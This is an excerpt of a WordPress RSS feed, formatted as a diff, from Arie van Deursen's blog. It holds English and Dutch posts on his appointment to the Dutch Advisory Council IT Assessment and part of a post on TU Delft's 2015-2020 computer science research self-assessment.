+					<description><![CDATA[July 15, 2022, I have been appointed by the cabinet of the Dutch government as a member of the Advisory Council IT Assessment (AcICT), starting September 1st, 2022. I am happy, and honored, with this appointment! The task of the council is as follows (my own translation): The Advisory Council IT Assessment judges risks and [&#8230;]]]></description>
+										<content:encoded><![CDATA[
+<p>July 15, 2022, I have been <a href="https://www-adviescollegeicttoetsing-nl.translate.goog/publicaties/ministerraad-benoemt-twee-nieuwe-leden-adviescollege-ict-toetsing?_x_tr_sl=auto&amp;_x_tr_tl=en&amp;_x_tr_hl=en&amp;_x_tr_pto=wapp">appointed</a> by the cabinet of the Dutch government as a member of the Advisory Council IT Assessment (<a href="https://www.adviescollegeicttoetsing.nl/">AcICT</a>), starting September 1st, 2022. I am happy, and honored, with this appointment!</p>
+
+
+
+<p>The <a href="https://www-adviescollegeicttoetsing-nl.translate.goog/het-adviescollege/positionering-en-opdracht?_x_tr_sl=auto&amp;_x_tr_tl=en&amp;_x_tr_hl=en&amp;_x_tr_pto=wapp">task</a> of the council is as follows (my own translation):</p>
+
+
+
+<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow">
+<p>The <strong>Advisory Council IT Assessment</strong> judges risks and the chance of success of ICT (Information and Communication Technology) projects within the Dutch national government, and offers advice for improvement. It also assesses the effectiveness and efficiency of the maintenance and management of information systems. The council consists of experts, from academia and industry, who have administrative, supervisory and management experience with regard to the realization, deployment and control of ICT processes.</p>
+</blockquote>
+
+
+<div class="wp-block-image">
+<figure class="alignright size-large is-resized"><a href="https://avandeursen.com/wp-content/uploads/2022/07/screen-shot-2022-07-23-at-21.20.19.png"><img loading="lazy" width="453" height="199" data-attachment-id="1513" data-permalink="https://avandeursen.com/screen-shot-2022-07-23-at-21-20-19/" data-orig-file="https://avandeursen.com/wp-content/uploads/2022/07/screen-shot-2022-07-23-at-21.20.19.png" data-orig-size="453,199" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Screen Shot 2022-07-23 at 21.20.19" data-image-description="" data-image-caption="" data-medium-file="https://avandeursen.com/wp-content/uploads/2022/07/screen-shot-2022-07-23-at-21.20.19.png?w=300" data-large-file="https://avandeursen.com/wp-content/uploads/2022/07/screen-shot-2022-07-23-at-21.20.19.png?w=453" src="https://avandeursen.com/wp-content/uploads/2022/07/screen-shot-2022-07-23-at-21.20.19.png?w=453" alt="" class="wp-image-1513" style="width:352px;height:155px" srcset="https://avandeursen.com/wp-content/uploads/2022/07/screen-shot-2022-07-23-at-21.20.19.png 453w, https://avandeursen.com/wp-content/uploads/2022/07/screen-shot-2022-07-23-at-21.20.19.png?w=150 150w, https://avandeursen.com/wp-content/uploads/2022/07/screen-shot-2022-07-23-at-21.20.19.png?w=300 300w" sizes="(max-width: 453px) 100vw, 453px" /></a></figure>
+</div>
+
+
+<p>Ministeries submit any project with an ICT-component of over 5 million Euros to the council. Based on a risk assessment, the council subsequently decides whether it conducts an investigation.</p>
+
+
+
+<p>Since 2015, almost 100 <a href="https://www.adviescollegeicttoetsing.nl/onderzoeken">assessments</a> have been conducted, on various domains.  Recent examples include <a href="https://www.adviescollegeicttoetsing.nl/documenten/publicaties/2022/06/29/bit-advies-moderniseren-examens">high school exams</a>, <a href="https://www.adviescollegeicttoetsing.nl/documenten/publicaties/2022/06/29/bit-advies-digitaliseren-schatkistbankieren">governmental treasury banking</a>, <a href="https://www.adviescollegeicttoetsing.nl/documenten/publicaties/2022/04/21/bit-advies-rationalisatie-auto-motorrijtuigenbelasting-mrb">vehicle taxes</a>, and the development process of the <a href="https://www.adviescollegeicttoetsing.nl/onderzoeken/documenten/publicaties/2022/03/09/advies-evaluatie-ontwikkelproces-coronamelder-app">Dutch Covid-19 tracking</a> app.</p>
+
+
+
+<p>The resulting assessment reports are 7-8 pages long, centered around a number (typically three) of core risks, followed by specific recommendations (also often three) on how to address these risks. Example risks from recent reports include:</p>
+
+
+
+<ul class="wp-block-list">
+<li>&#8220;Key project results are not yet complete in the final stages of the project&#8221; (treasury)</li>
+
+
+
+<li>&#8220;An unnecessarily fine-grained solution takes too much time&#8221; (exams)</li>
+
+
+
+<li>&#8220;The program needs to realize too many changes simultaneously&#8221; (vehicle taxes)</li>
+</ul>
+
+
+
+<p>The corresponding recommendations:</p>
+
+
+
+<ol class="wp-block-list">
+<li>&#8220;Work towards a fallback scenario so that the old system can remain in operation until the new system is demonstrably stable&#8221; (treasury)</li>
+
+
+
+<li>&#8220;Establish how to simplify the solution&#8221; (exams)</li>
+
+
+
+<li>&#8220;Reduce the scope&#8221; (vehicle taxes)</li>
+</ol>
+
+
+
+<p>The assessments are prepared by a <a href="https://www.adviescollegeicttoetsing.nl/het-adviescollege/medewerkers-adviescollege">team</a> of presently around 20 ICT researchers and research managers. When needed, external researchers with specific expertise are consulted. Assessments follow an <a href="https://www-adviescollegeicttoetsing-nl.translate.goog/onze-werkwijze/documenten/publicaties/2021/12/01/toetskader-acict?_x_tr_sl=auto&amp;_x_tr_tl=en&amp;_x_tr_hl=en&amp;_x_tr_pto=wapp">assessment framework</a>, which distinguishes nine risk areas (such as scope, architecture, implementation, and acceptance).</p>
+
+
+
+<p>The assessments serve to support political decision making, and are focused on the Dutch parliament and ministers. For each assessment, the minister in question offers a formal reaction, also available from the council&#8217;s <a href="https://www.adviescollegeicttoetsing.nl/onderzoeken">web site</a>. This serves to help parliament to fullfil their responsibility of checking the executive ministers.</p>
+
+
+
+<p>The council consists of five members, each involved part time (for one day per week), for a period of four years, each bringing their own dedicated expertise. For me personally, I see a strong connection with my research and education at the TU Delft, in such areas as software architecture, software testing, and developer productivity.</p>
+
+
+
+<p>As a computer scientist, I consider responsible, transparent, and cost-effective digitalization of great importance for the (Dutch) democracy and society. The advisory council fulfills a unique and important role, which is closely connected to my interests in software engineering. I look forward, together with my new colleagues from the <a href="https://www.adviescollegeicttoetsing.nl/">AcICT</a>, to contributing to the improvement of the digitalizations of the Dutch government.</p>
+
+
+
+<p>I am presently not aware of comparable councils in other countries, in Europe or elsewhere. If you know of similar institutions in your own country, please let me know!</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>https://avandeursen.com/2022/08/15/member-advisory-council-ict-assessments/feed/</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+		<post-id xmlns="com-wordpress:feed-additions:1">1514</post-id>
+		<media:thumbnail url="https://avandeursen.com/wp-content/uploads/2022/07/screen-shot-2022-07-23-at-21.03.14.png" />
+		<media:content url="https://avandeursen.com/wp-content/uploads/2022/07/screen-shot-2022-07-23-at-21.03.14.png" medium="image">
+			<media:title type="html">screen-shot-2022-07-23-at-21.03.14</media:title>
+		</media:content>
+
+		<media:content url="https://2.gravatar.com/avatar/ef31012d0a49cad89443a15b6cbec6a9a27c1e8f5ebfa8c1b47ecf83f83fc3aa?s=96&#38;d=identicon&#38;r=G" medium="image">
+			<media:title type="html">avandeursen</media:title>
+		</media:content>
+
+		<media:content url="https://avandeursen.com/wp-content/uploads/2022/07/screen-shot-2022-07-23-at-21.20.19.png?w=453" medium="image" />
+	</item>
+		<item>
+		<title>Lid Adviescollege ICT-toetsing</title>
+		<link>https://avandeursen.com/2022/08/15/lid-adviescollege-ict-toetsing/</link>
+					<comments>https://avandeursen.com/2022/08/15/lid-adviescollege-ict-toetsing/#respond</comments>
+		
+		<dc:creator><![CDATA[Arie van Deursen]]></dc:creator>
+		<pubDate>Mon, 15 Aug 2022 10:51:06 +0000</pubDate>
+				<category><![CDATA[Society]]></category>
+		<category><![CDATA[acict]]></category>
+		<category><![CDATA[risk assessments]]></category>
+		<category><![CDATA[software architecture]]></category>
+		<category><![CDATA[software metrics]]></category>
+		<guid isPermaLink="false">http://avandeursen.com/?p=1502</guid>
+
+					<description><![CDATA[]]></description>
+										<content:encoded><![CDATA[
+<div class="wp-block-jetpack-markdown"><p>Op 15 juli 2022 ben ik door de ministerraad <a href="https://www.adviescollegeicttoetsing.nl/publicaties/ministerraad-benoemt-twee-nieuwe-leden-adviescollege-ict-toetsing">benoemd</a> als lid van het Adviescollege ICT-toetsing (<a href="https://www.adviescollegeicttoetsing.nl/">AcICT</a>), op voorstel van staatssecretaris Van Huffelen van Koninkrijksrelaties en Digitalisering, per 1 september 2022. Ik ben blij en vereerd met deze benoeming!</p>
+<p>De <a href="https://www.adviescollegeicttoetsing.nl/het-adviescollege/positionering-en-opdracht">opdracht</a> van dit college is:</p>
+<blockquote>
+<p>Het Adviescollege ICT-toetsing oordeelt over de risico’s en de slaagkans van ICT (Informatie- en Communicatie Technologie) projecten binnen de Rijksoverheid en geeft adviezen ter verbetering. Ook toetst het de doeltreffendheid en doelmatigheid van onderhoud en beheer van informatiesystemen. Het adviescollege bestaat uit deskundigen &#8211; uit de wetenschappelijke wereld en het bedrijfsleven &#8211; die beschikken over bestuurlijke, toezichthoudende en managementervaring met betrekking tot realisatie, inzet en beheersing van ICT-trajecten.</p>
+</blockquote>
+<p>Ministeries melden elk project met een ICT-component van meer dan 5 miljoen Euro bij het Adviescollege aan. Op basis van een risicoanalyse beslist het AcICT vervolgens of het een onderzoek uitvoert.</p>
+<p>Sinds 2015 (toen nog als Bureau ICT-toetsing &#8212; BIT) zijn bijna honderd <a href="https://www.adviescollegeicttoetsing.nl/onderzoeken">onderzoeken</a> uitgevoerd, recent bijvoorbeeld over het moderniseren van <a href="https://www.adviescollegeicttoetsing.nl/documenten/publicaties/2022/06/29/bit-advies-moderniseren-examens">examens</a>, het digitaliseren van <a href="https://www.adviescollegeicttoetsing.nl/documenten/publicaties/2022/06/29/bit-advies-digitaliseren-schatkistbankieren">schatkistbankieren</a>, het rationaliseren van de <a href="https://www.adviescollegeicttoetsing.nl/documenten/publicaties/2022/04/21/bit-advies-rationalisatie-auto-motorrijtuigenbelasting-mrb">motorrijtuigenbelasting</a>, en het ontwikkelproces van de <a href="https://www.adviescollegeicttoetsing.nl/onderzoeken/documenten/publicaties/2022/03/09/advies-evaluatie-ontwikkelproces-coronamelder-app">Coronamelder</a> app.</p>
+<p>De meeste adviezen zijn 7-8 pagina&#8217;s in omvang, en zijn opgebouwd rond een kern van (vaak drie) belangrijke risico&#8217;s, gevolgd door enkele (ook vaak drie) concrete adviezen hoe de koers bij te stellen in het licht van deze risico&#8217;s. Genoemde risico&#8217;s zijn bijvoorbeeld:</p>
+<ol>
+<li>&quot;Cruciale projectresultaten nog niet gereed zijn in het eindstadium van het project&quot; (<a href="https://www.adviescollegeicttoetsing.nl/documenten/publicaties/2022/06/29/bit-advies-digitaliseren-schatkistbankieren">Schatkistbankieren</a>)</li>
+<li>&quot;Onnodig fijnmazige oplossing kost veel tijd&quot; (<a href="https://www.adviescollegeicttoetsing.nl/documenten/publicaties/2022/06/29/bit-advies-moderniseren-examens">Examens</a>)</li>
+<li>&quot;Het programma moet te veel veranderingen tegelijk realiseren&quot; (<a href="https://www.adviescollegeicttoetsing.nl/documenten/publicaties/2022/04/21/bit-advies-rationalisatie-auto-motorrijtuigenbelasting-mrb">Motorrijtuigenbelasting</a>)</li>
+</ol>
+<p>Met bijbehorend advies:</p>
+<ol>
+<li>&quot;Werk een terugvalscenario uit zodat het oude systeem blijft functioneren
+totdat het nieuwe systeem aantoonbaar stabiel is.&quot; (<a href="https://www.adviescollegeicttoetsing.nl/documenten/publicaties/2022/06/29/bit-advies-digitaliseren-schatkistbankieren">Schatkistbankieren</a>)</li>
+<li>&quot;Identificeer hoe de oplossing eenvoudiger kan&quot; (<a href="https://www.adviescollegeicttoetsing.nl/documenten/publicaties/2022/06/29/bit-advies-moderniseren-examens">Examens</a>)</li>
+<li>&quot;Beperk de scope&quot; (<a href="https://www.adviescollegeicttoetsing.nl/documenten/publicaties/2022/04/21/bit-advies-rationalisatie-auto-motorrijtuigenbelasting-mrb">Motorrijtuigenbelasting</a>)</li>
+</ol>
+</div>
+
+
+<div class="wp-block-image">
+<figure class="alignright size-large is-resized"><a href="https://www.adviescollegeicttoetsing.nl/onze-werkwijze/toetskader/toetskader"><img loading="lazy" data-attachment-id="1507" data-permalink="https://avandeursen.com/2022/08/15/lid-adviescollege-ict-toetsing/screen-shot-2022-07-23-at-21-03-14/#main" data-orig-file="https://avandeursen.com/wp-content/uploads/2022/07/screen-shot-2022-07-23-at-21.03.14.png" data-orig-size="1056,1138" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="screen-shot-2022-07-23-at-21.03.14" data-image-description="" data-image-caption="" data-medium-file="https://avandeursen.com/wp-content/uploads/2022/07/screen-shot-2022-07-23-at-21.03.14.png?w=278" data-large-file="https://avandeursen.com/wp-content/uploads/2022/07/screen-shot-2022-07-23-at-21.03.14.png?w=640" src="https://avandeursen.com/wp-content/uploads/2022/07/screen-shot-2022-07-23-at-21.03.14.png?w=950" alt="" class="wp-image-1507" width="260" height="280" srcset="https://avandeursen.com/wp-content/uploads/2022/07/screen-shot-2022-07-23-at-21.03.14.png?w=260 260w, https://avandeursen.com/wp-content/uploads/2022/07/screen-shot-2022-07-23-at-21.03.14.png?w=520 520w, https://avandeursen.com/wp-content/uploads/2022/07/screen-shot-2022-07-23-at-21.03.14.png?w=139 139w, https://avandeursen.com/wp-content/uploads/2022/07/screen-shot-2022-07-23-at-21.03.14.png?w=278 278w" sizes="(max-width: 260px) 100vw, 260px" /></a></figure>
+</div>
+
+
+<div class="wp-block-jetpack-markdown"><p>De adviezen worden voorbereid door een <a href="https://www.adviescollegeicttoetsing.nl/het-adviescollege/medewerkers-adviescollege">team</a> van (op dit moment) circa 20 ICT-onderzoekers en -onderzoeksmanagers. Waar nodig worden ook externe onderzoekers met specifieke expertise ingezet. Leidraad voor elk onderzoek is het <a href="https://www.adviescollegeicttoetsing.nl/onze-werkwijze/toetskader/toetskader">toetskader</a>, waarin negen risicogebieden (zoals bijv. scope, architectuur, realisatie, en acceptatie) worden onderscheiden.</p>
+<p>De adviezen dienen ter ondersteuning van de politieke besluitvorming, en zijn dus gericht op de Eerste en Tweede Kamer en de ministers en staatssecretarissen.  De minister reageert op het onderzoek van het AcICT middels een brief die ook openbaar is (en ook te vinden op de <a href="https://www.adviescollegeicttoetsing.nl/onderzoeken">AcICT website</a>), waarna het parlement de adviezen en de bestuurlijke reactie kan controleren.</p>
+<p>Het Adviescollege zelf telt vijf leden, elk met hun eigen expertise, die dit werk in deeltijd doen (één dag per week), voor een periode van vier jaar. Voor mij zie ik een mooie aansluiting bij mijn onderzoek en onderwijs aan de TU Delft, bijvoorbeeld op het gebied van software-architectuur, software-testen, en efficiëntie van  het software-ontwikkelproces.</p>
+<p>Verantwoorde, transparante, en kosten-effectieve digitalisering is van groot belang voor de Nederlandse democratie en samenleving. In het realiseren hiervan speelt het Adviescollege een belangrijke rol, en ik wil me dus graag inzetten voor het AcICT.</p>
+<p>Ik zie ook een mooie connectie tussen de taken van het Adviescollege en mijn eigen kennis en ervaring op het gebied van software engineering. Ik kijk er naar uit om, samen met de nieuwe collega&#8217;s van het AcICT, een bijdrage te leveren aan de succesvolle digitalisering van de Nederlandse overheid.</p>
+</div>
+]]></content:encoded>
+					
+					<wfw:commentRss>https://avandeursen.com/2022/08/15/lid-adviescollege-ict-toetsing/feed/</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+		<post-id xmlns="com-wordpress:feed-additions:1">1502</post-id>
+		<media:thumbnail url="https://avandeursen.com/wp-content/uploads/2022/07/screen-shot-2022-07-23-at-21.03.14.png" />
+		<media:content url="https://avandeursen.com/wp-content/uploads/2022/07/screen-shot-2022-07-23-at-21.03.14.png" medium="image">
+			<media:title type="html">screen-shot-2022-07-23-at-21.03.14</media:title>
+		</media:content>
+
+		<media:content url="https://2.gravatar.com/avatar/ef31012d0a49cad89443a15b6cbec6a9a27c1e8f5ebfa8c1b47ecf83f83fc3aa?s=96&#38;d=identicon&#38;r=G" medium="image">
+			<media:title type="html">avandeursen</media:title>
+		</media:content>
+
+		<media:content url="https://avandeursen.com/wp-content/uploads/2022/07/screen-shot-2022-07-23-at-21.03.14.png?w=950" medium="image" />
+	</item>
+		<item>
+		<title>TU Delft Computer Science Research Assessment 2015-2020</title>
+		<link>https://avandeursen.com/2022/07/04/tu-delft-computer-science-research-assessment-2015-2020/</link>
+					<comments>https://avandeursen.com/2022/07/04/tu-delft-computer-science-research-assessment-2015-2020/#respond</comments>
+		
+		<dc:creator><![CDATA[Arie van Deursen]]></dc:creator>
+		<pubDate>Mon, 04 Jul 2022 20:01:10 +0000</pubDate>
+				<category><![CDATA[Research]]></category>
+		<category><![CDATA[Leadership]]></category>
+		<category><![CDATA[organization]]></category>
+		<category><![CDATA[research]]></category>
+		<category><![CDATA[research assessment]]></category>
+		<guid isPermaLink="false">http://avandeursen.com/?p=1485</guid>
+
+					<description><![CDATA[Last year, the TU Delft computer science research programs were evaluated, comprising a reflection on the preceding six years (2015-2020), and an outlook the next six years. The assessment follows the Strategy Evaluation Protocol (SEP), used by all Dutch universities, which focuses on research quality, societal impact, and viability. The assessment is conducted by an [&#8230;]]]></description>
+										<content:encoded><![CDATA[
+<p>Last year, the TU Delft computer science research programs were evaluated, comprising a reflection on the preceding six years (2015-2020), and an outlook the next six years.</p>
+
+
+
+<p>The assessment follows the <em>Strategy Evaluation Protocol</em> (<a href="https://www.universiteitenvannederland.nl/en_GB/sep-eng.html">SEP</a>), used by all Dutch universities, which focuses on <em>research quality</em>, <em>societal impact</em>, and <em>viability</em>. The assessment is conducted by an international external committee. It is based on a self-assessment written by us, as well as a two-day site visit by the committee.</p>
+
+
+<div class="wp-block-image is-style-default">
+<figure class="alignleft size-large is-resized"><a href="https://avandeursen.com/wp-content/uploads/2022/07/alan-arie-vmb-hires.jpg"><img loading="lazy" data-attachment-id="1494" data-permalink="https://avandeursen.com/2022/07/04/tu-delft-computer-science-research-assessment-2015-2020/alan-arie-vmb-hires/#main" data-orig-file="https://avandeursen.com/wp-content/uploads/2022/07/alan-arie-vmb-hires.jpg" data-orig-size="3429,4850" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="alan-arie-vmb-hires" data-image-description="" data-image-caption="" data-medium-file="https://avandeursen.com/wp-content/uploads/2022/07/alan-arie-vmb-hires.jpg?w=212" data-large-file="https://avandeursen.com/wp-content/uploads/2022/07/alan-arie-vmb-hires.jpg?w=640" src="https://avandeursen.com/wp-content/uploads/2022/07/alan-arie-vmb-hires.jpg?w=724" alt="Arie van Deursen and Alan Hanjalic in the Computer Science building" class="wp-image-1494" width="187" height="265" srcset="https://avandeursen.com/wp-content/uploads/2022/07/alan-arie-vmb-hires.jpg?w=187 187w, https://avandeursen.com/wp-content/uploads/2022/07/alan-arie-vmb-hires.jpg?w=374 374w, https://avandeursen.com/wp-content/uploads/2022/07/alan-arie-vmb-hires.jpg?w=106 106w, https://avandeursen.com/wp-content/uploads/2022/07/alan-arie-vmb-hires.jpg?w=212 212w" sizes="(max-width: 187px) 100vw, 187px" /></a></figure>
+</div>
+
+
+<p>At TU Delft, computer science is organized into two departments: <em><a href="https://www.tudelft.nl/ewi/over-de-faculteit/afdelingen/intelligent-systems">Intelligent Systems</a></em>, chaired by <a href="https://www.tudelft.nl/ewi/over-de-faculteit/afdelingen/intelligent-systems/multimedia-computing/people/alan-hanjalic">Alan Hanjalic</a> and <em><a href="https://www.tudelft.nl/en/eemcs/the-faculty/departments/software-technology">Software Technology</a></em>, chaired by me.</p>
+
+
+
+<p>In 2021, Alan and I together worked hard to compile our self-assessment report. It is based on extensive discussions with and contributions by many people, both inside and outside the two departments. It contains our thoughts on what we want computer science in Delft to achieve (our mission), what we did to achieve this (our strategy), an assessment of the success of our approach (our SWOT), and a plan of action for the next years ahead (our future strategy).</p>
+
+
+<div class="wp-block-image">
+<figure class="alignright size-large is-resized"><a href="https://avandeursen.com/wp-content/uploads/2022/07/cs-delft-self-assessment-2015-2020.pdf"><img loading="lazy" data-attachment-id="1484" data-permalink="https://avandeursen.com/screenshot-cover/" data-orig-file="https://avandeursen.com/wp-content/uploads/2022/07/screenshot-cover.png" data-orig-size="1070,1508" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Self-assessment report" data-image-description="" data-image-caption="" data-medium-file="https://avandeursen.com/wp-content/uploads/2022/07/screenshot-cover.png?w=213" data-large-file="https://avandeursen.com/wp-content/uploads/2022/07/screenshot-cover.png?w=640" src="https://avandeursen.com/wp-content/uploads/2022/07/screenshot-cover.png" alt="" class="wp-image-1484" width="184" height="259" srcset="https://avandeursen.com/wp-content/uploads/2022/07/screenshot-cover.png?w=184&amp;h=259 184w, https://avandeursen.com/wp-content/uploads/2022/07/screenshot-cover.png?w=368&amp;h=519 368w, https://avandeursen.com/wp-content/uploads/2022/07/screenshot-cover.png?w=106&amp;h=150 106w, https://avandeursen.com/wp-content/uploads/2022/07/screenshot-cover.png?w=213&amp;h=300 213w" sizes="(max-width: 184px) 100vw, 184px" /></a></figure>
+</div>
+
+
+<p>We proudly make the full self-assessment report available via this <a href="https://avandeursen.com/wp-content/uploads/2022/07/cs-delft-self-assessment-2015-2020.pdf">link</a> &#8212; the only modification being that for reasons of privacy we omitted some of the appendices that could be traced back too easily to individual faculty members.</p>
+
+
+
+<p>As part of the protocol, the committee&#8217;s findings, as well as the reaction of the executive board to these findings, have been made available as well, at the <a href="https://www.tudelft.nl/en/research/our-research-vision/quality-assurance/results">central TU Delft site</a>. The committee is &#8220;positive about the very high and often excellent research quality, the high quality of the staff as well as the energy, drive and potential of the primarily junior research staff of both departments,&#8221; and &#8220;recognizes the relevance and societal impact of the researchcarried out the INSY and ST departments.&#8221;</p>
+
+
+
+<p>We are grateful to the external committee, and in particular for the 17 recommendations that will help us further strengthen TU Delft computer science. We have integrated these recommendations in the action plan already laid out in our self-assessment, and look forward to work with everyone in our departments and our faculty to execute this action plan in the next few years.</p>
+
+
+
+<p>Below, we provide the executive summary of our self-assessment, and we invite you to have a look at our <a href="https://avandeursen.com/wp-content/uploads/2022/07/cs-delft-self-assessment-2015-2020.pdf">full report</a>.</p>
+
+
+
+<hr class="wp-block-separator has-alpha-channel-opacity" />
+
+
+
+<h2 class="wp-block-heading">Self-Assessment Summary</h2>
+
+
+
+<p>The phenomena of <em>datafication</em> and <em>AI-zation</em> reflect the increasing tendency to quantify everything through data and to automate the decision-making processes that are also largely based on data. Since these phenomena have entered all segments of our lives and since research in computer science (CS) is at the heart of the technological developments underlying these phenomena, CS as a research field has gained strategic importance. TU Delft Computer Science operates at the forefront of these developments with the aim to help society at large, by enabling it to maximally benefit from these phenomena, while protecting it from potential risks. To that end, inspired and driven by the TU Delft core values of <em>Diversity</em>, <em>Inclusion</em>, <em>Respect</em>, <em>Engagement</em>, <em>Courage</em> and <em>Trust</em> (<a href="https://www.tudelft.nl/en/about-tu-delft/strategy/tu-delft-strategic-framework-2018-2024">DIRECT</a>), our mission includes (1) conducting world class research in selected computer science core areas; (2) maximizing opportunities for societal impact of our research; (3) providing rigorous, research-inspired engineering education in computer science; and (4) contributing to an international academic culture that is open, diverse and inclusive, and that offers openly available knowledge.</p>
+
+
+
+<p>We are organized in two departments, <em><a href="https://www.tudelft.nl/ewi/over-de-faculteit/afdelingen/intelligent-systems">Intelligent Systems</a></em> and <em><a href="https://www.tudelft.nl/en/eemcs/the-faculty/departments/software-technology">Software Technology</a></em>, consisting of 5 and 6 <em>sections</em> respectively. Sections are small-scale organizational units, typically headed by a full or associate professor and marking a particular CS disciplinary scope. While the departments are separate units, they work closely together in research and education, and collaborate for societal impact. The convergence between the departments in terms of alignment and joint pursuit of strategic and operational goals has even become so strong over recent years that we can speak of an increasingly recognizable CS entity in Delft organizing its research into five main <em>themes</em> transcending the departmental and section boundaries: (1) decision support; (2) data management and analytics; (3) software systems engineering; (4) networked and distributed systems; and (5) security and privacy. The themes offer critical mass in order to achieve substantial impact, and each theme involves many researchers with various CS backgrounds and expertise.</p>
+
+
+
+<p>Award-winning research in these themes achieved during 2015-2020 include a novel cross-modal (e.g., combining text and images) retrieval method based on adverserial learning; genetic algorithms for the automatic reproduction of software crashes to facilitate automated debugging; and Trustchain, a permission-less tamper-proof data structure for storing transaction records of agents with applications in digital identity. International recognition of our expertise is reflected by numerous leadership roles, e.g., as general or program chairs in numerous flagship conferences, such as AAAI, EuroGraphics, ACM/IEEE ICSE, ACM OOPSLA, ACM RecSys and ACM Multimedia. In the same time period, several staff members also received the highest (inter)national recognition in their fields, such as IEEE Fellow, membership of the Young Academy of the Royal Dutch Academy of Sciences, or the Netherlands Prize for ICT Research. Our scientific reputation also brought us into the consortia of two prestigious NWO Gravitation Projects (&#8220;<a href="https://www.nwo.nl/en/calls/gravitation">NWO Zwaartekracht</a>&#8220;) of the Dutch Research Council, Hybrid Intelligence and BRAINSCAPES &#8211; the consortia that <em>&#8220;belong to the world top in their field of research or have the potential to do so&#8221;</em></p>
+
+
+
+<p>To maximize societal impact, we embrace eight key <em>sectors</em>: transport and logistics, energy, health and well-being, safety and security, finance, online education, creative industry, and smart cities. To enable and support us in making substantial interdisciplinary impact in these sectors, we have built up expertise, a network of collaborators and societal partners, and established the necessary organizational structures. Prominent examples of our impact in these sectors include the <em>NGS sequencing analysis pipeline</em> we designed and implemented as part of the NIPT test, which is used routinely by hospitals in several countries; <em>Cytosplore</em>, a software system for interactive visual single-cell profiling of the immune system; and <em>SocialGlass</em>, a tool suite for integration, enrichment, and sense-making of urban data. Our close ties with society are also reflected in our strategic collaborations with socio-economical partners, such as ING, DSM, Booking.com, Adyen, Ripple, Erasmus Medical Center and Leiden University Medical Center, leading amongst other things to strategic investments in the form of three large industry-funded labs (with ING, DSM and Booking.com) setup in the assessed time period for a duration of five years. Furthermore, we have invested extensive effort in public outreach, explaining and discussing science with a broad audience, and in particular in the context of complex societal debates in the domain of AI and blockchain. Finally, we play a leading role in regional, national and European initiatives, most notably in the Dutch AI Coalition (NLAIC).</p>
+
+
+
+<p>In addition to scientific excellence and strong impact in the selected societal sectors, we are committed to (a) meeting the increasing societal need for highly skilled CS experts, (b) development of human capital in our organization, leading to a new generation of international academic leaders, and (c) advancing the organization and academic culture, with the key pillars of open science, diversity and inclusion.</p>
+
+
+
+<p>Regarding (a), we embraced an over 100% increase of our student population, but also aim at securing the highest possible level of their knowledge, skills and academic forming despite scaling up. Therefore, we value a close connection between research and education, and let both MSc and BSc students participate actively in our research. We also formulated an ambitious strategy, the realization of which would enable us to manage this education scale-up efficiently and effectively, leaving sufficient room to our staff for further developing scientific excellence and deploying it for societal impact. Part of this strategy is the growth of our academic staff towards 100 FTE by 2024 to meet the stabilization of the student numbers (due to numerus fixus). Between 2015 and 2020, we already achieved a net growth from 54 to 72 faculty members (+33%), with more to come in the upcoming years.</p>
+
+
+
+<p>Next to BSc and MSc students, we are committed to delivering highly skilled CS experts at the PhD level. The number of PhD students grew from 105 to 165 (+57%) in the assessed time period, reflecting our ability to successfully acquire research funding in the present landscape. For our PhD students, the Graduate School defines a framework in which they can develop their skills next to conducting their thesis research. We strive towards completion of PhD theses within four years and organize our supervision, official moments of assessment, requirements on the volume and quality of the conducted research, as well as evidence of scientific impact through publications, accordingly.</p>
+
+
+
+<p>Regarding (b), development of human capital: as computer science expertise is in high demand across the globe, finding strong new people as well as retaining our current staff proved highly challenging, especially given the high teaching load due to our record student intake. Therefore, acquiring, developing and retaining academic talent has been one of our most important goals. Dedicated actions, such as devising of a <em>Development Track Plan</em>, serve to empower each staff member to provide contribution to the organization in his/her own way, based on individual interests, talents and ambitions, and in view of our joint ambition as organization.</p>
+
+
+
